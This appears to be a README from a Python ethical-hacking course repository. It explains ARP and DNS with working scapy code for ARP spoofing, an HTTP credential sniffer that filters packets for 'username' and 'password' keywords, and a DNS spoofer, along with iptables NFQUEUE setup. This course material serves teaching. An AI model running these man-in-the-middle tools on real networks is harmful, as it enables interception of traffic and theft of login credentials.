# Repository of all related with the python-security hacking course

## Python & Ethical Hacking From Scratch

### Useful command used along the course

`ifconfig` is used to display and manage information about network interfaces (both physical and virtual) on your system.

```sh
    ifconfig
```

### Common methods use to check object and variables, we are usig scapy as example:

- Display the fields that belong to the object:
```python
    print(arp_request.show())
```
Expected response:

![show() method response example](img/show%20method%20example.png)
- Print a concise summary of the packet's contents print a concise summary of the packet's contents:
```python
    print(arp_request.summary())
```
Expected response:

![summary() method response example](img/summary%20method%20example.png)

- To display the names of the fields of a class:
```python
    scapy.ls(scapy.ARP())
```
Expected response:

![ARP() method response example](img/ls%20method%20example.png)

- To display the arp table:
```sh
    arp -a
```
Expected response:

![arp table](img/arp%20table.png)

### Command to run the network_scanner script:

 **/24 Allowed to go through all the range from 0 to 254**

```sh
python  network_scanner.py --target {OUR_IP}/24
```

- This command is used to show the routing information for network traffic
```sh
    route -n
```
Expected response:

![route command response](img/router%20command%20and%20IP.png)

Command breakdown:

route: This is the command itself. It's used to manage the IP routing table on the system.

-n: This is an option or flag passed to the route command. The -n flag specifies that the output should be displayed
in numerical format, which means that hostnames (domain names) will not be resolved to IP addresses.
Instead, IP addresses will be displayed directly, which can make the output faster to display and easier to read when
you're only interested in the IP addresses and not the hostnames.

IP routing table:

- Destination: The destination network or host IP address.
- Gateway: The IP address of the next-hop router or gateway that should be used to reach the destination.
- Genmask: The subnet mask that defines the range of IP addresses in the destination network.
- Flags: Various flags that provide information about the route, such as whether it's a default route or a host-specific route.
- Metric: A metric value used to determine the "cost" of using this route. Lower metrics indicate a more preferred route.
- Ref: The number of references to this route.
- Use: A counter indicating how many times this route has been used.
- Iface: The network interface through which the traffic should be directed.

Allowing in the kaly machine to flow packets through.packet. Enabling IP  to work as a router:
```sh
    echo 1 > /proc/sys/net/ipv4/ip_forward
```

Expected response:

**We should be able, in the target computer, to have access to the internet.**

## ARP spoofing hacking

### Concepts related to the project.

 - [ARP (Address Resolution Protocol)](#arp-def): Is in charge of help in finding the MAC address of a device within a local network.

 - MAC: Unique hardware addresses assigned to network interface cards. It is used for actual data transmission at the hardware level

 - Network Interface Card (NIC): Sometimes referred to as a network adapter or network card, is a hardware component that connects
   a computer or other device to a network. Its primary function is to provide the physical interface between the device and the network,
   enabling communication between the device and other devices or servers on the same network or the broader internet.

 - IP: addresses are used for routing data across the broader internet.

 - ARP table: It is also known as an ARP cache, is a table maintained by network devices, such as computers and routers, to store a mapping between IP addresses
   and corresponding MAC addresses within a local network.

 ##How [ARP](#arp-def) Works?

1. **Device A Wants to Communicate with Device B:**
   - Device A needs to send data to Device B but only knows its IP address, not the MAC address.

2. **ARP Request Broadcast:**
   - Device A broadcasts an ARP request on the local network, asking, "Who has IP address X.X.X.X? Please tell me your MAC address."

3. **Other Devices Receive the ARP Request:**
   - All devices on the network hear this broadcast, but only Device B recognizes its IP address as the one being asked for.

4. **Device B Responds:**
   - Device B replies directly to Device A, stating, "I have IP address X.X.X.X, and my MAC address is Y:Y:Y:Y:Y:Y."

5. **Device A Updates Its ARP Cache:**
   - Device A receives the reply and updates its ARP cache, a table that stores IP-to-MAC mappings for local devices. Now, Device A knows Device B's MAC address.

6. **Communication Can Take Place:**
   - Armed with the MAC address, Device A can send data directly to Device B's hardware address. Data packets are then sent over the local network,
     with switches and routers ensuring the right delivery based on MAC addresses.

*** ADD A TYPICAL NETWORK IMAGE HERE ***


## How [ARP](#arp_def) spoofing Works:

Let's imagine a scenario with three devices: Device A (attacker), Device B (victim), and Device R (router).

**Normal ARP Process:**

1. Device B wants to send data to the router (Device R).
2. Device B sends out an ARP broadcast saying, "Hey, who has the MAC address of router R with IP address X.X.X.X?"
3. Device R replies with its MAC address.
4. Device B stores this mapping in its ARP table and can now send data to the router.

**ARP Spoofing:**

1. The attacker (Device A) wants to intercept the communication between Device B and the router (Device R).
2. Device A starts sending fake ARP replies to Device B, saying, "I'm the router (Device R) with IP address X.X.X.X, and here's my MAC address."
3. Device B receives this fake reply and updates its ARP table with the attacker's MAC address, thinking it's the router.
4. Now, whenever Device B wants to communicate with the router, it sends data to the attacker instead.

**Attack Consequences:**

- The attacker (Device A) can capture, modify, or analyze the data passing between Device B and the actual router (Device R).
- Device B is unaware that its communication is being intercepted, which can lead to data theft, manipulation, or other malicious activities.

*** ADD A SPOOFING NETWORK IMAGE HERE ***

## [Arp spoof script](arp_spoof.py):

##Objective:
- Redirect the flow of other packets, of other devices, through our computer.

##Steps:

1. **Getting the target MAC address method**

```python
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
```

2. **We are going to create an arp packet. To set, in the victim records, the router MAC address as ours**

- op=2 -> Use to send the ARP as a respond not a request, which would be 1.
- pdst="10.0.2.7" -> Destination IP, which is the one of the target device.
- hwdst="08:00:27:08:af:07" -> Hardware destination, MAC address of the target device.
- psrc="10.0.2.1" -> Source IP, that is set as the IP of the router to associate it, in the [ARP table](#arp_table) of the victim, with the MAC address
  of the attacker device.
Our Source MAC address will, automatically, set by scapy library.

```python
    scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")
```

2.a **Full spoof method**

```python
    def spoof(target_ip, spoof_if):
    target_mac = get_mac("192.168.5.2")
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_if)
    scapy.send(arp_packet)
```

3. **Restoring values back to original**

```python
def restore_arp_table(destination_ip, source_ip): # Target computer and router IPs
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac) # Important Set the MAC address os the source (hwsrc) to avoid scapy pick our
    scapy.send(packet, count=4, verbose=False) # We will send the packet 4 times (count=4) to make sure is received

```

4. **Creating a loop to avoid the original values setted back**

```python
target_ip = "10.0.3.7"
gateway_router_ip = "10.0.3.1"
try:
    packets_sent_count = 0
    while True: # We have to keep sending the packets to keep being 'the man in the middle'
        spoof(target_ip, gateway_router_ip) # target_computer_ip, router_ip, tell the target I'm the router
        spoof(gateway_router_ip, target_ip) # router_ip, target_computer_ip, tell the router I'm the computer
        packets_sent_count = packets_sent_count +2
        print("\r[+] Packets sent: " + str(packets_sent_count))  # \r to start printing at the start of the line (Override the current print statement)
        sys.stdout.flush()  # To avoid pythong save string in a buffer, just flush ad show
        time.sleep(2) # To avoid sending too many packets
except KeyboardInterrupt: # KeyboardInterrupt is the error thrown when click Ctrl + c
    print("\n[-] Ctrl + C pressed... Restoring ARP tables...Pleas wait....\n")
    restore_arp_table(gateway_router_ip, target_ip)
    restore_arp_table(target_ip, gateway_router_ip)
```

For python 3 print statement we would set it as below and we don't need flush()
```python
    print("\r[+] Packets sent: " +str(packets_sent_count), end="")
```
## [Packet snifer](packet_snifer.py):

 - This tool allowed us to capture data flowing through an interface, data that we got with our ARP spofing tool, filter the data
  and display interesting information (Login info such as username and passwords, visited websites, images, urls,...)

  **Intercepting and modifying packets**

1. Trap packets in a queue and access this queue and control it from our script.

And the first thing that we want to do is redirect any packets that we receive on this computer to this
queue, to the queue that we said will trap all the requests, all the responses.
And to do that, we're going to use a program called IP Tables.
This is a program that is installed on UNIX computers that allow us to modify routes on the computer.
Now, IP tables can be used to do so many things and one of them is modifying routing rules, redirecting chaings packets
to a queue.

```sh
    iptables -I FORDWARD -J NFQUEUE --queue-num 125
```

[^1]: 1.b Create local testing environment.

They only go into the "FORDWARD" chain if they're coming from a different computer so in order to test our script locally we have to first create a queue for
the the "OUTPUT" chain, this is the chain where packets leaving my computer go through, that's the one I want to trap its packets. So the only thing that's
going to differ when testing on a local machine or against a remote machine with ARP spoofing is the IP tables rules.

```sh
    iptables -I OUTPUT -j NFQUEUE --queue-num 357
```

Second we have to create a queue for the the "INPUT" chain, this is the chain packets coming to my computer.

```sh
    iptables -I INPUT -j NFQUEUE --queue-num 357
```

Once we finish testing and we want to make an attack to another system we have to run:

```sh
    iptables --flush
```

and, for reasons explain before, run:

```sh
    iptables -I FORDWARD -J NFQUEUE --queue-num 125
```

**Remember use the same --queue-num in the queue.bind statement in the script**

So right now what we did is we created the queue and you can think of what's going to happen now if
we are the man in the middle and your requests that we're going to get or responses will be trapped
in a queue like this one.

Now we have to install a module as usual:

```sh
    pip install netfilterqueue
```

When we finish with the attack we have to make sure we delete the IP table we create at the beginning

```sh
    iptables --flush
```

1.c Run web server.

In kali, by default, we have installed an Apache web service so to run it, and get an IP that we can use to redirect the target we just have to run the
command below. We are going to use the same IP locally and in the real attack to other systems, at least in our case:

```sh
    service apache2 start
```

If Apache run successfully we won't see any response, but we can see the server values running `netstat -tuln`. The expected result would be:

![route command response](img/apache_start_flow.png)

**When we see :::80 in a server configuration, it means that the server is configured to listen on all available IPv6 addresses on port 80.
This allows the server to accept incoming HTTP requests on any IPv6 interface it has.**

2. Script explanation:

```python
    def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    # iface set the interface we are going to sniff on
    # store Tell scapy not to store packets in memory so no pressure in our computer
    # prn here we can call a function each time the function catch a package (data)
    # filter Would Allows us to filter packets using Berkeley packet filter syntax (BPF) check https://biot.com/capstats/bpf.html

def process_sniffed_packet(packet):
    # Check if the packet has a HTTPRequest layer, URLs, imges, videos, passwords, are sent using HTTPRequest layer
    if packet.haslayer(http.HTTPRequest): # We use http.HTTPRequest because scapy doesn't have a http filter by default
        if packet.haslayer(scapy.Raw): # Command to chech if the packet has a specific layer. We saw, when running the script, that the useful info is in the 'raw' layer
            load = packet[scapy.Raw].load # packet (packet name)  [scapy.Raw](layer we are interested in PRINTING) .load(To print a specific field within the layer)
            load_str = load.decode() # Convert bytes to string using UTF-8 encoding, to avoid "TypeError: a bytes-like object is required, not 'str'" error
            keywords = ["username", "user", "login", "password", "pass"] #Possible keywords in the load field
            for keyword in keywords:
                if keyword in load_str:
                    print(load)
                    break # To print load field value at most one, in case more than one keyword is in load layer
            #print(packet.show()) # .show() To know which layer contains the info we are looking for

sniff("eth0")
```

## [DNS spoof](dns_spoof.py):

What a DNS is?

- So basically DNS is use as translator from domain names, such as Booking.com or Facebook.com, to the IP addresses
of the servers hosting these websites.

How a DNS spoof works?

- We know that when a hacker manages to become the man in the middle, regardless of how they achieve that,
all the requests sent from the user will have to flow through the hacker's computer. The hacker will then forward
that to its destination. Same goes for the responses. They'll flow through the hacker and the hacker will forward them to the user.
Now, as packets are flowing through the hacker's computer, the hacker can control the direction and the content of these packets.
Now, let's say the user wants to go to CNN.com. The hacker is going to receive this request. And at this stage, the hacker has
a number of ways to serve the IP of the hacker's web server, which is 0 to 16.

And instead of the IP of Booking.com, this is very dangerous because we'll be able to hijack and spoof any DNS request made
by the user and serve the user. Fake websites, fake login pages, fake updates, and so on.

How a DNS response looks like?

Lets generate a DNS to see what we got:

The line below in our dns_spoof script specify what layer we want to see (scapy.DNSRR)

```python
    if scapy_packet.haslayer(scapy.DNSRR):
```
We have to have our input and output packets redirect to my computer to the queue that's in our code. As is explain here locally [^1].
And then we can run, in terminal, the command below to generate the request:

```python
    ping -c 1 www.bing.com
```

We should received the response below:

![ping expected response](img/ping_expected_response.png)

And if we run our *process_packet* method as below:

```python
    def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print(scapy_packet.show())
    packet.accept()
```

Whe should be able to see the print, among other things, of the response as shown below. The main answer that we'd be interested
in is the "qtype = A" record, that's the one that converts domain names to IP:

![DNS response record](img/DNS_response_record.png)

 We'll see the answer in here and you can see the our data field is the field that contains the IP, which is the same IP
that we received when we pinged bing.com ("rdata = 13.107.21.200"), that is the one we want to modify first. Look for "\an"
as in answer:

![DNS layer to modify](img/DNS_layer_to_modify.png)

1. Modify packets before forwarding them to their destination.

Some response fields introduction:

- len: layer corresponds to the length of or the size of the layer.

- chksum (checksum): It's used to make sure that the packet has not been modified.

```python
    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload()) # packet.get_payload() will get us a string of the data inside this packet, but we would't be able to access the layers nicely
        if scapy_packet.haslayer(scapy.DNSRR): # DNSRR stand for DNS Resource Record which is the name we'll see in the response
            qname = scapy_packet[scapy.DNSQR].qname # Where the domain's name inside the layer is set
            if "www.bing.com" in qname:
                print("[+] Spoofing target")
                                    # rrname:website that the user requested, rdate: the IP returned as the IP of the requested domain
                answer = scapy.DNSRR(rrname=qname, rdata="Ip_to_redirect_target") # Creating DNS response, we only need the field scapy can not set by itself
                scapy_packet[scapy.DNS].an = answer # Set the "\an" field to the modify answer
                scapy_packet[scapy.DNS].ancount = 1 # Set the field ancount to the amount of answer we are going to send

                # Remove them from our packet and then when we send them, Skippy will automatically recalculate them based on the values that we modified.
                # so the file don't get corrupted by our modify answer
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                # set the payload, on its the original format 'str', and send the packet we want to be forwarder (.accept())
                packet.set_payload(str(scapy_packet))
        packet.accept()
```
**Steps to run the DNS spoof**



1. Check original IP address:

```sh
    ping -c www.bing.com
```

Result expected:

![ping expected response](img/ping_expected_response.png)

2. Redirect any packets:

```sh
    iptables -I OUTPUT -j NFQUEUE --queue-num 357
    iptables -I INPUT -j NFQUEUE --queue-num 357
```

or in case wewant do a real attack:

```sh
    iptables -I FORDWARD -j NFQUEUE --queue-num 137
```

3. Start Apache server:

```sh
    service apache2 start
```

4. Run our script, if we are in `root@kali:~/PycharmProjects/pythonProject#` the folder where the script is:

```sh
    python dns_spoof.py
```

4.a Check original IP has change to the one in ur script:

```sh
    ping -c www.bing.com
```

Result expected:

![success script result](img/ping_IP_change_expected_response.png)

# Modifying data in the HTTP layer

Edit request/responses
Replace download requests
Inject code (Html/JavaScript)